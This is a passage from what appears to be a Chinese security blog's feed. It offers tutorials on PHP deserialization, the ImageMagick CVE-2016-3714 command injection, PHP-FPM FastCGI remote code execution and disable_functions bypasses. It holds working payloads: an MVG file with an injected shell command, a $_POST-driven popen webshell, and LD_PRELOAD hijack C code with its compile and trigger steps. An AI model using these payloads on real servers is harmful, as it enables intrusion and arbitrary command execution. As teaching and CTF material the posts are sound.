的序列化后属性名会变为 %00*%00shuxing_name<br>2.另外一点就是,一个对象被反序列化出来后，他就释放在内存空间成为一个真正存在的对象了<br>3.还有一点是，序列化只会记录属性和值，不会记录函数<br>4.反序列化后不会调用__constrict()</p><h1 id="利用phar文件"><a href="#利用phar文件" class="headerlink" title="利用phar文件"></a>利用phar文件</h1><p>当使用phar文件时，phar文件的meta-data是以序列化的形式存储在phar文件中的.<br><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210221152417.png" alt="QQ截图20210221152417"><br>那么如何利用呢</p><h3 id="基本姿势"><a href="#基本姿势" class="headerlink" title="基本姿势:"></a>基本姿势:</h3><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219153247.png" alt="QQ截图20210219153247"></p><p>使用phar://协议访问<br><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219153304.png" alt="QQ截图20210219153304"><br>使用phar://协议，是不用管后缀名，一个jpg文件都可以被phar://协议打开<br>phar://协议访问文件常用 phar://文件路径</p><h3 id="进阶姿势"><a href="#进阶姿势" class="headerlink" title="进阶姿势"></a>进阶姿势</h3><p>1.幻术头加在stub上<br>有些waf是检验文件头的，检验到 ?&gt;是不让过的。所以需要改改stub，在stub的前面加上一些幻术头同时修改文件后缀名来绕过.<br><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219153317.png" alt="QQ截图20210219153317"></p><h3 id="下面是能够触发phar反序列化的函数"><a href="#下面是能够触发phar反序列化的函数" class="headerlink" title="下面是能够触发phar反序列化的函数"></a>下面是能够触发phar反序列化的函数</h3><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219153330.png" alt="QQ截图20210219153330"></p><h2 id="Phar文件创建模板"><a href="#Phar文件创建模板" class="headerlink" title="Phar文件创建模板"></a>Phar文件创建模板</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$phar &#x3D; new Phar(&#39;test.phar&#39;);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;addFromString(&#39;test.txt&#39;, &#39;text&#39;);</span><br><span class="line">$phar-&gt;setStub(&#39;&lt;?php __HALT_COMPILER(); ? &gt;&#39;);</span><br><span class="line">$phar-&gt;setMetadata($c);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure><h1 id="php版本7-1以上，对类属性检测不严格导致的反序列化问题"><a href="#php版本7-1以上，对类属性检测不严格导致的反序列化问题" class="headerlink" title="php版本7.1以上，对类属性检测不严格导致的反序列化问题"></a>php版本7.1以上，对类属性检测不严格导致的反序列化问题</h1><p>php7.1+反序列化的对象可以直接以public属性的形式对原类中的protected形式的属性进行修改。<br>比如[网鼎杯 2020 青龙组]AreUSerialz一题。其难点在于你必须在反序列化payload中修改一个protected的属性才能拿到flag，但是有一个判断语句让你不能在反序列化payload出现%00字符。 所以此处我们在做payload的时候，把protected属性改成public属性再序列化也行。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">    protected $op;</span><br><span class="line">    protected $filename;</span><br><span class="line">    protected $content;</span><br><span class="line"></span><br><span class="line">    public function process() &#123;</span><br><span class="line">        if($this-&gt;op &#x3D;&#x3D; &quot;1&quot;) &#123;</span><br><span class="line">            $this-&gt;write();</span><br><span class="line">        &#125; else if($this-&gt;op &#x3D;&#x3D; &quot;2&quot;) &#123;</span><br><span class="line">            $res &#x3D; $this-&gt;read();</span><br><span class="line">            $this-&gt;output($res);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $this-&gt;output(&quot;Bad Hacker!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">        private function read() &#123;</span><br><span class="line">        $res &#x3D; &quot;&quot;;</span><br><span class="line">        if(isset($this-&gt;filename)) &#123;</span><br><span class="line">            $res &#x3D; file_get_contents($this-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        return $res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">        function __destruct() &#123;</span><br><span class="line">        if($this-&gt;op &#x3D;&#x3D;&#x3D; &quot;2&quot;)</span><br><span class="line">            $this-&gt;op &#x3D; &quot;1&quot;;</span><br><span class="line">        $this-&gt;content &#x3D; &quot;&quot;;</span><br><span class="line">        $this-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">function is_valid($s) &#123;</span><br><span class="line">    for($i &#x3D; 0; $i &lt; strlen($s); $i++)</span><br><span class="line">        if(!(ord($s[$i]) &gt;&#x3D; 32 &amp;&amp; ord($s[$i]) &lt;&#x3D; 125))</span><br><span class="line">            return false;</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET&#123;&#39;str&#39;&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    $str &#x3D; (string)$_GET[&#39;str&#39;];</span><br><span class="line">    if(is_valid($str)) &#123;</span><br><span class="line">        $obj &#x3D; unserialize($str);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>关键代码放这里。逻辑是从get参数获取数据并反序列化。然后我们通过反序列化payload操控op让它为2并且filename=flag.php。但是我们正常思路制造payload时因为op和filename是proteced属性，难免会有%00字符出现，但是它又让你不能出现%00这种ascii码小于32的字符。所以我们直接把op和filename当作public属性处理也可以直接过去<br>也就是说payload这样写</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">new  FileHandler&#123;</span><br><span class="line">    public $op&#x3D;2;</span><br><span class="line">    public $filename&#x3D;&quot;flag.php&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="绕过-wakeup方法-CVE-2016-7124"><a href="#绕过-wakeup方法-CVE-2016-7124" class="headerlink" title="绕过__wakeup方法(CVE-2016-7124)"></a>绕过__wakeup方法(CVE-2016-7124)</h1><p>只需构建一个序列化字段，它的变量数与实际不符即可。<br>像这样O:4:”xctf”:3:{s:4:”flag”;s:3:”111″;s:5:”flsag”;s:3:”111″;}<br>这里本身有2个变量，但在标识变量数时与实际不符，就会绕过__wakeup<br>适用版本:PHP5 &lt; 5.6.25 PHP7 &lt; 7.0.10</p><h1 id="session存储调用与php反序列化引发的安全问题"><a href="#session存储调用与php反序列化引发的安全问题" class="headerlink" title="session存储调用与php反序列化引发的安全问题"></a>session存储调用与php反序列化引发的安全问题</h1><h4 id="1-基础功能"><a href="#1-基础功能" class="headerlink" title="1.基础功能:"></a>1.基础功能:</h4><p>session信息在服务器端存储时，其内容是通过一系列比如通过序列化等操作加工改变了的，而当其被调用时，又能逆加工回原有的内容，这是基础。 session信息在服务器端存储时，其加工方式可以通过php.ini文件的session.save_handler= 参数进行调整。 这个参数的不同值对应的加工方式如下:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$_SESSION[&#39;name&#39;]&#x3D;$_GET[&#39;name&#39;]  &#x2F;&#x2F;传入参数并在session文件里以name的变量名保存</span><br><span class="line"></span><br><span class="line">ini_set(&#39;session.serialize_handler&#39;,&#39;php&#39;)&#x3D;&gt;abc&#x3D;&gt;name|s:3:&quot;abc&quot;;</span><br><span class="line">&#x2F;&#x2F;变量名|序列化处理后的值 </span><br><span class="line"></span><br><span class="line">ini_set(&#39;session.serialize_handler&#39;,&#39;php_binary&#39;)&#x3D;&gt;abc&#x3D;&gt;#names:4:&quot;abcd&quot;;</span><br><span class="line">&#x2F;&#x2F;#为键名长度对应的ascii字符+变量名+序列化后的值</span><br><span class="line"></span><br><span class="line">ini_set(&#39;session.serialize_handler&#39;,&#39;php_serialize&#39;)&#x3D;&gt;abc&#x3D;&gt;a:1:&#123;s:4:&quot;name&quot;;s:3:&quot;abc&quot;;&#125;</span><br><span class="line">&#x2F;&#x2F;将变量以数组形式进行序列化处理</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219153504.png" alt="QQ截图20210219153504"></p><h4 id="2-在此基础上利用upload-process机制来实现-“即使没有输入点也能继续触发序列化漏洞”"><a href="#2-在此基础上利用upload-process机制来实现-“即使没有输入点也能继续触发序列化漏洞”" class="headerlink" title="2.在此基础上利用upload_process机制来实现 “即使没有输入点也能继续触发序列化漏洞”"></a>2.在此基础上利用upload_process机制来实现 “即使没有输入点也能继续触发序列化漏洞”</h4><p><strong>注:</strong> 如果没关session.upload_progress.cleanup，每次写入session的内容都会被删，这样的话只能使用条件竞争来搞了  <img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219153528.png" alt="QQ截图20210219153528">上面的话翻译为: 当session.upload_progress.enabled INI选项开启时，你在上传文件的同时POST一个参数值与session.upload_progress.name（默认为PHP_SESSION_UPLOAD_PROGRESS）值的值，会在session里留下session.upload_porgress.prefix与session.upload_progress.name链接的值，而后者的内容就是我们上传的文件的文件名. 试验一下 </p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219154237.png" alt="QQ截图20210219154237"> </p><p>抓包改包: </p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219154309.png" alt="QQ截图20210219154309"></p><p>确实有残留,于是凭此进行上面那条的操作开始反序列化攻击(文件包含也行)</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;php反序列化基础&quot;&gt;&lt;a href=&quot;#php反序列化基础&quot; class=&quot;headerlink&quot; title=&quot;php反序列化基础&quot;&gt;&lt;/a&gt;php反序列化基础&lt;/h1&gt;&lt;h2 id=&quot;基础：&quot;&gt;&lt;a href=&quot;#基础：&quot; class=&quot;headerlink</summary>
      
    
    
    
    
    <category term="php开发与安全" scheme="http://const27.com/tags/php%E5%BC%80%E5%8F%91%E4%B8%8E%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>imagemagick漏洞任意命令执行（cve-2016-3714）</title>
    <link href="http://const27.com/2021/02/19/imagemagick%E6%BC%8F%E6%B4%9E%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%88cve-2016-3714%EF%BC%89/"/>
    <id>http://const27.com/2021/02/19/imagemagick%E6%BC%8F%E6%B4%9E%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%88cve-2016-3714%EF%BC%89/</id>
    <published>2021-02-19T09:22:02.407Z</published>
    <updated>2021-02-19T08:50:02.673Z</updated>
    
    <content type="html"><![CDATA[<p>参考 <a href="https://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html">https://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html</a></p><h2 id="何为ImageMagick"><a href="#何为ImageMagick" class="headerlink" title="何为ImageMagick"></a>何为ImageMagick</h2><p>简而言之，就是一个处理图片的程序。</p><h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><p>ImageMagick有一个功能叫做 delegate(委托),作用是调用外部的lib处理文件。<br>在ImageMagick的配置文件 /etc/ImageMagick/delegates.xml 可以看到所有的委托(自己去看)</p><p>它的委托一般是长这样的,意思是在处理https图片时，会调用command的里的指令.command里的%m代表一种占位符，%m占位符代表获取https图片的url（当然占位符不仅仅%m一种，还有 比如%i是输入的文件名，%l是图片exif label信息 等等等等)</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;delegate decode&#x3D;&quot;https&quot; command&#x3D;&quot;&quot;curl&quot; -s -k -o &quot;%o&quot; &quot;https:%M&quot;&quot;&#x2F;&gt;</span><br></pre></td></tr></table></figure><p>ImageMagick默认支持一种图片格式，叫mvg，而mvg与svg格式类似，其中是以文本形式写入矢量图的内容，而这其中就可以包含https处理过程。 所以我们可以构造一个mvg文件(文件名后缀不一定非得.mvg，imagemagick是按照文件内容来区分文件类型的)交给imagemagick处理，在其包含https处使用|或&amp;分割命令，造成rce,如</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">fill &#39;url(https:&#x2F;&#x2F;&quot;|mkdir &#x2F;nmsl; &quot;)&#39;</span><br><span class="line">pop graphic-context</span><br></pre></td></tr></table></figure><p>上面是mvg的一种格式，其中在fill处填入https的url.</p><h2 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h2><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217152837.png" alt="QQ截图20210217152837"></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217152846.png" alt="QQ截图20210217152846"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;参考 &lt;a href=&quot;https://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html&quot;&gt;https://www.leavesongs.com/PENETRATION/CVE-2016-3714-I</summary>
      
    
    
    
    
    <category term="php开发与安全" scheme="http://const27.com/tags/php%E5%BC%80%E5%8F%91%E4%B8%8E%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>FastCgi协议&amp;PHP-FPM未授权导致RCE</title>
    <link href="http://const27.com/2021/02/19/FastCgi%E5%8D%8F%E8%AE%AE&amp;PHP-FPM%E6%9C%AA%E6%8E%88%E6%9D%83%E5%AF%BC%E8%87%B4RCE/"/>
    <id>http://const27.com/2021/02/19/FastCgi%E5%8D%8F%E8%AE%AE&amp;PHP-FPM%E6%9C%AA%E6%8E%88%E6%9D%83%E5%AF%BC%E8%87%B4RCE/</id>
    <published>2021-02-19T09:22:02.406Z</published>
    <updated>2021-02-19T08:50:05.205Z</updated>
    
    <content type="html"><![CDATA[<p>参考: <a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html</a> 离别歌</p><h2 id="Fastcgi"><a href="#Fastcgi" class="headerlink" title="Fastcgi"></a>Fastcgi</h2><p>要说PHP-FPM，首先就要说一下Fastcgi协议.</p><p>Fastcgi其实是一个和HTTP本质一样的通信协议。<br>HTTP用于浏览器和服务器中间件通信,Fastcgi用于服务器中间件与某个语言后端通信。<br>Fastcgi协议由多个record组成，record由header和body组成。<br>服务器中间件将body和header按照fastcgi规则封装好发送给语言后端，后端解码后拿到具体数据进行指定的操作，再按fastcgi协议封装号结果返回给服务器</p><p>record Header固定8个字节,每个变量一个字节<br>Body分为两类:真正的内容数据,和额外数据(非必须)<br>一个fastcgi record结构最大支持2^16=65536字节的body</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typedef struct &#123;</span><br><span class="line">  &#x2F;* Header *&#x2F;</span><br><span class="line">  unsigned char version; &#x2F;&#x2F; 版本</span><br><span class="line">  unsigned char type; &#x2F;&#x2F; 本次record的类型</span><br><span class="line">  unsigned char requestIdB1; &#x2F;&#x2F; 本次record对应的请求id</span><br><span class="line">  unsigned char requestIdB0;</span><br><span class="line">  unsigned char contentLengthB1; &#x2F;&#x2F; body体的大小</span><br><span class="line">  unsigned char contentLengthB0;</span><br><span class="line">  unsigned char paddingLength; &#x2F;&#x2F; 额外块大小</span><br><span class="line">  unsigned char reserved; </span><br><span class="line"></span><br><span class="line">  &#x2F;* Body *&#x2F;</span><br><span class="line">  unsigned char contentData[contentLength];</span><br><span class="line">  unsigned char paddingData[paddingLength];</span><br><span class="line">&#125; FCGI_Record;</span><br></pre></td></tr></table></figure><h3 id="Fastcgi-type"><a href="#Fastcgi-type" class="headerlink" title="Fastcgi type"></a>Fastcgi type</h3><p>也就是一个record的type变量。type用于表明该record的作用,以下是type主要的一些值<br><code>type</code>就是指定该record的作用。因为fastcgi一个record的大小是有限的，作用也是单一的，所以我们需要在一个TCP流里传输多个record。通过<code>type</code>来标志每个record的作用，用<code>requestId</code>作为同一次请求的id。</p><p><img src="https://www.leavesongs.com/media/attachment/2017/04/25/e29518b1-3574-426f-b75f-8cabbb89a15a.9efc537226ce.jpg" alt="14931267923354.jpg"></p><p>其中type=4 对我们接下来讲PHP-FPM有重要作用,他有四个不同的结构</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typedef struct &#123;</span><br><span class="line">  unsigned char nameLengthB0;  &#x2F;* nameLengthB0  &gt;&gt; 7 &#x3D;&#x3D; 0 *&#x2F;</span><br><span class="line">  unsigned char valueLengthB0; &#x2F;* valueLengthB0 &gt;&gt; 7 &#x3D;&#x3D; 0 *&#x2F;</span><br><span class="line">  unsigned char nameData[nameLength];</span><br><span class="line">  unsigned char valueData[valueLength];</span><br><span class="line">&#125; FCGI_NameValuePair11;</span><br><span class="line"></span><br><span class="line">typedef struct &#123;</span><br><span class="line">  unsigned char nameLengthB0;  &#x2F;* nameLengthB0  &gt;&gt; 7 &#x3D;&#x3D; 0 *&#x2F;</span><br><span class="line">  unsigned char valueLengthB3; &#x2F;* valueLengthB3 &gt;&gt; 7 &#x3D;&#x3D; 1 *&#x2F;</span><br><span class="line">  unsigned char valueLengthB2;</span><br><span class="line">  unsigned char valueLengthB1;</span><br><span class="line">  unsigned char valueLengthB0;</span><br><span class="line">  unsigned char nameData[nameLength];</span><br><span class="line">  unsigned char valueData[valueLength</span><br><span class="line">          ((B3 &amp; 0x7f) &lt;&lt; 24) + (B2 &lt;&lt; 16) + (B1 &lt;&lt; 8) + B0];</span><br><span class="line">&#125; FCGI_NameValuePair14;</span><br><span class="line"></span><br><span class="line">typedef struct &#123;</span><br><span class="line">  unsigned char nameLengthB3;  &#x2F;* nameLengthB3  &gt;&gt; 7 &#x3D;&#x3D; 1 *&#x2F;</span><br><span class="line">  unsigned char nameLengthB2;</span><br><span class="line">  unsigned char nameLengthB1;</span><br><span class="line">  unsigned char nameLengthB0;</span><br><span class="line">  unsigned char valueLengthB0; &#x2F;* valueLengthB0 &gt;&gt; 7 &#x3D;&#x3D; 0 *&#x2F;</span><br><span class="line">  unsigned char nameData[nameLength</span><br><span class="line">          ((B3 &amp; 0x7f) &lt;&lt; 24) + (B2 &lt;&lt; 16) + (B1 &lt;&lt; 8) + B0];</span><br><span class="line">  unsigned char valueData[valueLength];</span><br><span class="line">&#125; FCGI_NameValuePair41;</span><br><span class="line"></span><br><span class="line">typedef struct &#123;</span><br><span class="line">  unsigned char nameLengthB3;  &#x2F;* nameLengthB3  &gt;&gt; 7 &#x3D;&#x3D; 1 *&#x2F;</span><br><span class="line">  unsigned char nameLengthB2;</span><br><span class="line">  unsigned char nameLengthB1;</span><br><span class="line">  unsigned char nameLengthB0;</span><br><span class="line">  unsigned char valueLengthB3; &#x2F;* valueLengthB3 &gt;&gt; 7 &#x3D;&#x3D; 1 *&#x2F;</span><br><span class="line">  unsigned char valueLengthB2;</span><br><span class="line">  unsigned char valueLengthB1;</span><br><span class="line">  unsigned char valueLengthB0;</span><br><span class="line">  unsigned char nameData[nameLength</span><br><span class="line">          ((B3 &amp; 0x7f) &lt;&lt; 24) + (B2 &lt;&lt; 16) + (B1 &lt;&lt; 8) + B0];</span><br><span class="line">  unsigned char valueData[valueLength</span><br><span class="line">          ((B3 &amp; 0x7f) &lt;&lt; 24) + (B2 &lt;&lt; 16) + (B1 &lt;&lt; 8) + B0];</span><br><span class="line">&#125; FCGI_NameValuePair44;</span><br></pre></td></tr></table></figure><ol><li>key、value均小于128字节，用<code>FCGI_NameValuePair11</code></li><li>key大于128字节，value小于128字节，用<code>FCGI_NameValuePair41</code></li><li>key小于128字节，value大于128字节，用<code>FCGI_NameValuePair14</code></li><li>key、value均大于128字节，用<code>FCGI_NameValuePair44</code></li></ol><h2 id="PHP-FPM"><a href="#PHP-FPM" class="headerlink" title="PHP-FPM"></a>PHP-FPM</h2><p>FPM是Fastcgi协议的解析器.中间件以fastcgi协议把用户传来的数据封装传给FPM。下面这个图就是fastcgi协议的模样</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219142802.png" alt="QQ截图20210219142802"></p><p>键值对.即fastcgi的type=4，这就是上面专门说这个的目的.<br>其中script_filename只向要执行的php文件</p><h2 id="Nginx-IIS7-解析漏洞深入"><a href="#Nginx-IIS7-解析漏洞深入" class="headerlink" title="Nginx(IIS7)解析漏洞深入"></a>Nginx(IIS7)解析漏洞深入</h2><p>以前记录过这个中间件漏洞，但没有详细的去了解为什么。这里就说说</p><p>在php fix_pathinfo开启的情况下,传入 url/1.txt/.php时,1.txt会被当作php文件解析.</p><p>究其原因，是因为配置文件中 security.limit_extensions默认限定了.php后缀文件才交给php-fpm处理,传入给fpm的数据是类似这样的</p><p><img src="http://www.const27.com/wp-content/uploads/2020/06/%E5%9B%BE%E7%89%87-67.png" alt="img"></p><p>按理说应该报错404吧，但是fix_pathinfo会判断这个SCRIPT_FILENAME是否存在，若不存在就会去掉最后一个/后面的内容再次判断，知道文件存在为止，再把该文件当作PHP文件执行</p><h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><p>上面那个解析漏洞只是个题外话。<br>我们来讲讲RCE。服务器默认PHP-FPM端口是9000，如果这个端口暴露在公网，我们就可以自己构造fastcgi协议与fpm通信.</p><p>此时我们就能想出rce的雏形，控制SCRIPT_FILENAME去执行我们的shell，反弹个shell什么的，但是前提是我们必须得上传一个shell上去，太笨比，于是我们继续思考.</p><p>上面提到我们可以通过fastcgi协议临时更改PHP的一些配置项(环境参数).我们不如把 <code>auto_prepend_file</code>或<code>auto_append_file</code>(自动包含某文件) 设置为php://input(需allow_url_include=on),然后SCRIPT_FILENAME设置为任意一个服务器上存在的PHP文件（PHP文件不仅仅在服务器目录才会有，PHP程序目录下也会有PHP文件），即可通过控制POST的包体来实现RCE。就像这样</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219142817.png" alt="QQ截图20210219142817"></p><p>exp: <a href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75">https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75</a></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219142836.png" alt="QQ截图20210219142836"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;参考: &lt;a href=&quot;https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html&quot;&gt;https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.</summary>
      
    
    
    
    
    <category term="php开发与安全" scheme="http://const27.com/tags/php%E5%BC%80%E5%8F%91%E4%B8%8E%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>PHP disablefunctions绕过</title>
    <link href="http://const27.com/2021/02/19/DisableFunctions%E7%BB%95%E8%BF%87/"/>
    <id>http://const27.com/2021/02/19/DisableFunctions%E7%BB%95%E8%BF%87/</id>
    <published>2021-02-19T09:22:02.404Z</published>
    <updated>2021-02-19T08:50:07.317Z</updated>
    
    <content type="html"><![CDATA[<h2 id="RCE函数黑名单绕过"><a href="#RCE函数黑名单绕过" class="headerlink" title="RCE函数黑名单绕过:"></a>RCE函数黑名单绕过:</h2><p>1.exec/shell_exec (执行系统命令,无回显)</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo (exec&#x2F;shell_exec(&#39;whoami&#39;));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>2.system/passthru (执行系统命令,有回显)</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   passthru&#x2F;system(&#39;whoami&#39;);?&gt;</span><br></pre></td></tr></table></figure><p>3.popen （<strong>popen</strong> ( string <code>$command</code> , string <code>$mode</code> ) ）<br>作用:创建一个管道,fork一个子进程来执行传入的command命令。并在正常的情况下返回I/O流,管道由pclose手动关闭.</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php$command&#x3D;$_POST[&#39;cmd&#39;];</span><br><span class="line">$handle &#x3D; popen($command , &quot;r&quot;);</span><br><span class="line">   while(!feof($handle))</span><br><span class="line">   &#123;        echo fread($handle, 1024);  &#x2F;&#x2F;fread($handle, 1024);</span><br><span class="line">   &#125;  </span><br><span class="line">   pclose($handle);?&gt;</span><br></pre></td></tr></table></figure><p>4.proc_open ( <strong>proc_open</strong> ( string <code>$cmd</code> , array <code>$descriptorspec</code> , array <code>&amp;$pipes</code> )<br>可以看作是popen的强化版.<br>作用:创建一个管道,fork一个子进程来执行传入的command命令,$descriptorspec控制子进程文件描述符符，$pipes是数组，其元素是返回的I/O流(索引0，1，2代表对于文件描述符的I/O流)</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$descriptorspec写法</span><br><span class="line"> $descs &#x3D; array( </span><br><span class="line">                0 &#x3D;&gt; array( &#39;pipe&#39; , &#39;r&#39; ) ,  #输入</span><br><span class="line">                1 &#x3D;&gt; array( &#39;file&#39; , &#39;output&#39; , &#39;w&#39; ) , #输出，可以为管道(pipe)或文件</span><br><span class="line">                2 &#x3D;&gt; array( &#39;file&#39; , &#39;errors&#39; , &#39;w&#39; )   #错误日志，可以为管道(pipe)或文件</span><br><span class="line">            );</span><br><span class="line">&lt;?php</span><br><span class="line">   $command&#x3D;&quot;ipconfig&quot;;</span><br><span class="line">   $descriptorspec &#x3D; array(1 &#x3D;&gt; array(&quot;pipe&quot;, &quot;w&quot;));  &#x2F;&#x2F;标准输出定位到管道</span><br><span class="line">   $handle &#x3D; proc_open($command ,$descriptorspec , $pipes);</span><br><span class="line">   while(!feof($pipes[1]))   &#x2F;&#x2F;管道索引1代表子进程的标准输出（通过$descriptorspec定义)</span><br><span class="line">   &#123;        echo fread($pipes[1], 1024); &#x2F;&#x2F;fgets($pipes[1],1024);</span><br><span class="line">   &#125;?&gt;</span><br></pre></td></tr></table></figure><h2 id="LD-PRELOAD与putenv-绕过"><a href="#LD-PRELOAD与putenv-绕过" class="headerlink" title="LD_PRELOAD与putenv 绕过"></a>LD_PRELOAD与putenv 绕过</h2><p>LD_PRELOAD这个环境变量定义的动态链接库会比其他动态链接库先被调用.<br>putenv(“环境变量名”=”value”) php代码里用于设置环境变量的函数<br>动态链接库(.so文件): 命令在运行时会进行系统调用,从共享链接库里调用代码.动态链接库是共享链接库的一种，其里面一般都是.so文件<br>关于系统调用,链接库等等知识放在另一个文章 <a href="http://www.const27.com/">www.const27.com</a></p><h3 id="利用php代码里的mail函数达到绕过目的"><a href="#利用php代码里的mail函数达到绕过目的" class="headerlink" title="利用php代码里的mail函数达到绕过目的"></a>利用php代码里的mail函数达到绕过目的</h3><p>通过strace查看php里的mail函数,发现其调用了 linux里的sendmail指令</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">execve(&quot;&#x2F;usr&#x2F;bin&#x2F;php&quot;, [&quot;php&quot;, &quot;test.php&quot;], [&#x2F;* 20 vars *&#x2F;]) &#x3D; 0</span><br><span class="line">[pid 23864] execve(&quot;&#x2F;bin&#x2F;sh&quot;, [&quot;sh&quot;, &quot;-c&quot;, &quot;&#x2F;usr&#x2F;sbin&#x2F;sendmail -t -i &quot;], [&#x2F;* 20 vars *&#x2F;]) &#x3D; 0</span><br><span class="line">[pid 23865] execve(&quot;&#x2F;usr&#x2F;sbin&#x2F;sendmail&quot;, [&quot;&#x2F;usr&#x2F;sbin&#x2F;sendmail&quot;, &quot;-t&quot;, &quot;-i&quot;], [&#x2F;* 20 vars *&#x2F;]) &#x3D; 0</span><br></pre></td></tr></table></figure><p>发现其调用了sendmail，那么sendmail调用了什么?可以很清楚的看到它调用了很多命令,那么我们思路如下：<br>创建一个动态链接库，定义一个同名命令（植入payload)，并在之后把它放在LD_PRELOAD里优先调用,这样只需执行调用了mail函数的php文件，再又mail函数调用sendmail命令，再由sendmail命令优先调用我们重写的命令，即可绕过disable_functions.</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219154527.png" alt="QQ截图20210219154527"></p><p>我们这里重写getuid命令:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">void payload() &#123;</span><br><span class="line">        system(&quot;ls &#x2F; &gt; &#x2F;tmp&#x2F;sky&quot;);   &#x2F;&#x2F;payload</span><br><span class="line">&#125;</span><br><span class="line">int geteuid() </span><br><span class="line">&#123;</span><br><span class="line">    if (getenv(&quot;LD_PRELOAD&quot;) &#x3D;&#x3D; NULL) &#123; return 0; &#125;</span><br><span class="line">    unsetenv(&quot;LD_PRELOAD&quot;);</span><br><span class="line">    payload();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后将他编译为动态链接库</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc -c -fPIC hack.c -o hack</span><br><span class="line">gcc --share hack -o hack.so</span><br></pre></td></tr></table></figure><p>接下来运行PHP脚本</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">putenv(&quot;LD_PRELOAD&#x3D;.&#x2F;hack.so&quot;);</span><br><span class="line">mail(&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>执行一下，可以发现payload确实被执行了</p><p><img 